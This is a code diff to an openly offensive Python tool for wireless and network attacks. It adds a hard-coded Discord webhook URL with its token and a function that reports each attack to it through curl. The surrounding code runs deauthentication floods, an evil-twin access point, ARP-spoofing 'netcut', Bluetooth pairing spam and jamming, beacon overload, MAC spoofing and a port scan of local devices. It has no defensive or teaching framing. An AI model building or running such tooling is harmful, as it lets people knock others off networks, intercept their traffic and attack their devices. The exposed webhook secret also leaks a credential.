@@ -39,6 +39,19 @@ deauth_target = "broadcast"
 allch_target = "broadcast"
 apover_target = "broadcast"
 
+discord_webhook = "https://discord.com/api/webhooks/1509759458505654273/EjVRG1Vj0Mkr77zDFPdw2ayDVv4vLLCuPZCl24_vOkGKEbFZ2FHd0gdC49SMmPlLtdx-"
+
+# ============================================
+# discord webhook
+# ============================================
+
+def send_discord(title, desc, color=0xcc0000):
+    try:
+        data = {"embeds": [{"title": title, "description": desc, "color": color, "timestamp": datetime.datetime.now().isoformat()}]}
+        subprocess.run(["curl", "-H", "Content-Type: application/json", "-X", "POST", "-d", json.dumps(data), discord_webhook], capture_output=True)
+    except:
+        pass
+
 # ============================================
 # mac changer
 # ============================================
@@ -56,6 +69,7 @@ def change_mac():
         os.system(f"sudo ifconfig {interface} down")
         os.system(f"sudo ifconfig {interface} hw ether {new_mac}")
         os.system(f"sudo ifconfig {interface} up")
+        send_discord("🔄 mac changed", f"new mac: {new_mac}")
         return new_mac
     except:
         return "failed"
@@ -155,7 +169,7 @@ channel=6
     os.system("sudo hostapd /tmp/hostapd.conf -B")
     os.system("sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0")
     os.system("sudo dnsmasq -a 192.168.1.1 -d -i wlan0 -F 192.168.1.50,192.168.1.150,255.255.255.0 &")
-    
+    send_discord("🎭 evil twin started", f"ssid: {target_ssid}")
     return True
 
 def stop_evil_twin():
@@ -163,6 +177,7 @@ def stop_evil_twin():
     evil_twin_running = False
     os.system("sudo pkill -9 hostapd")
     os.system("sudo pkill -9 dnsmasq")
+    send_discord("🎭 evil twin stopped", "done")
 
 # ============================================
 # device tracker (real time)
@@ -218,12 +233,14 @@ def bt_spam_pairing_start(mac):
             os.system(f"sudo hcitool auth {mac} 2>/dev/null &")
             time.sleep(0.3)
     threading.Thread(target=spam, daemon=True).start()
+    send_discord("🔵 bt spam started", f"target: {mac}")
     return True
 
 def bt_spam_pairing_stop():
     global bt_spam_running
     bt_spam_running = False
     os.system("sudo pkill -9 l2ping")
+    send_discord("🔵 bt spam stopped", "done")
 
 # ============================================
 # netcut & speed control
@@ -244,6 +261,7 @@ def netcut_start(target_ip, duration=60):
     end = time.time() + duration
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     add_attack_log("netcut", target_ip, duration, "started")
+    send_discord("✂️ netcut started", f"target: {target_ip} ({duration}s)")
     while netcut_running and time.time() < end:
         os.system(f"sudo arpspoof -i {interface} -t {target_ip} {gateway} > /dev/null 2>&1 &")
         os.system(f"sudo arpspoof -i {interface} -t {gateway} {target_ip} > /dev/null 2>&1 &")
@@ -357,6 +375,7 @@ def device_scan():
         for port, dtype in [(80, "web"), (22, "ssh"), (23, "router"), (443, "https"), (554, "cctv"), (37777, "cctv"), (8000, "dvr")]:
             if os.system(f"nc -zv {ip} {port} 2>&1 > /dev/null") == 0: device_type = dtype; break
         devices_found.append({"ip": ip, "type": device_type, "status": "alive"})
+    send_discord("📱 device scan", f"found {len(devices_found)} devices")
     return devices_found
 
 # ============================================
@@ -380,9 +399,11 @@ def start_deauth_brutal(duration=60, target_ssid="broadcast"):
     if target_ssid != "broadcast":
         bssid = get_bssid_from_ssid(target_ssid)
         add_attack_log("deauth_brutal", target_ssid, duration, "started")
+        send_discord("🔴 deauth started", f"target: {target_ssid} ({duration}s)")
     else:
         bssid = "FF:FF:FF:FF:FF:FF"
         add_attack_log("deauth_brutal", "broadcast", duration, "started")
+        send_discord("🔴 deauth started", f"target: broadcast ({duration}s)")
     
     while attack_running and time.time() < end:
         os.system(f"sudo iw dev {interface} set bitrates legacy-2.4 1")
@@ -393,6 +414,7 @@ def start_deauth_brutal(duration=60, target_ssid="broadcast"):
     if attack_running:
         current_attack = "idle"
     add_attack_log("deauth_brutal", target_ssid if target_ssid != "broadcast" else "broadcast", duration, "completed")
+    send_discord("🟢 deauth finished", f"target: {target_ssid if target_ssid != 'broadcast' else 'broadcast'}")
 
 def start_all_channels(duration=60, target_ssid="broadcast"):
     global attack_running, current_attack
@@ -404,9 +426,11 @@ def start_all_channels(duration=60, target_ssid="broadcast"):
     if target_ssid != "broadcast":
         bssid = get_bssid_from_ssid(target_ssid)
         add_attack_log("all_channels", target_ssid, duration, "started")
+        send_discord("🔴 all channels started", f"target: {target_ssid} ({duration}s)")
     else:
         bssid = "FF:FF:FF:FF:FF:FF"
         add_attack_log("all_channels", "broadcast", duration, "started")
+        send_discord("🔴 all channels started", f"target: broadcast ({duration}s)")
     
     def attack_channel(ch):
         while attack_running and time.time() < end:
@@ -423,6 +447,7 @@ def start_all_channels(duration=60, target_ssid="broadcast"):
     for t in threads: t.join()
     if attack_running: current_attack = "idle"
     add_attack_log("all_channels", target_ssid if target_ssid != "broadcast" else "broadcast", duration, "completed")
+    send_discord("🟢 all channels finished", f"target: {target_ssid if target_ssid != 'broadcast' else 'broadcast'}")
 
 def start_ap_overload(duration=60, target_ssid="broadcast"):
     global attack_running, current_attack
@@ -432,6 +457,7 @@ def start_ap_overload(duration=60, target_ssid="broadcast"):
     ssids = [f"fake_{i}" for i in range(50)]
     
     add_attack_log("ap_overload", target_ssid if target_ssid != "broadcast" else "broadcast", duration, "started")
+    send_discord("🔴 ap overload started", f"target: {target_ssid if target_ssid != 'broadcast' else 'broadcast'} ({duration}s)")
     
     while attack_running and time.time() < end:
         for ssid in ssids:
@@ -439,6 +465,7 @@ def start_ap_overload(duration=60, target_ssid="broadcast"):
         time.sleep(0.05)
     if attack_running: current_attack = "idle"
     add_attack_log("ap_overload", target_ssid if target_ssid != "broadcast" else "broadcast", duration, "completed")
+    send_discord("🟢 ap overload finished", f"target: {target_ssid if target_ssid != 'broadcast' else 'broadcast'}")
 
 def start_bluetooth_brutal(duration=60):
     global attack_running, current_attack, bluetooth_running
@@ -447,6 +474,7 @@ def start_bluetooth_brutal(duration=60):
     bluetooth_running = True
     end = time.time() + duration
     add_attack_log("bluetooth_brutal", "broadcast", duration, "started")
+    send_discord("🔵 bt brutal started", f"duration: {duration}s")
     while attack_running and bluetooth_running and time.time() < end:
         os.system("sudo hciconfig hci0 reset 2>/dev/null")
         os.system("sudo hciconfig hci0 down 2>/dev/null")
@@ -458,6 +486,7 @@ def start_bluetooth_brutal(duration=60):
     bluetooth_running = False
     if attack_running: current_attack = "idle"
     add_attack_log("bluetooth_brutal", "broadcast", duration, "completed")
+    send_discord("🟢 bt brutal finished", "done")
 
 def stop_all():
     global attack_running, current_attack, bluetooth_running, netcut_running, evil_twin_running, bt_spam_running
@@ -475,6 +504,7 @@ def stop_all():
     os.system("sudo pkill -9 dnsmasq 2>/dev/null")
     remove_speed_limit()
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    send_discord("⏹️ all attacks stopped", "emergency stop")
 
 def get_ip():
     try:
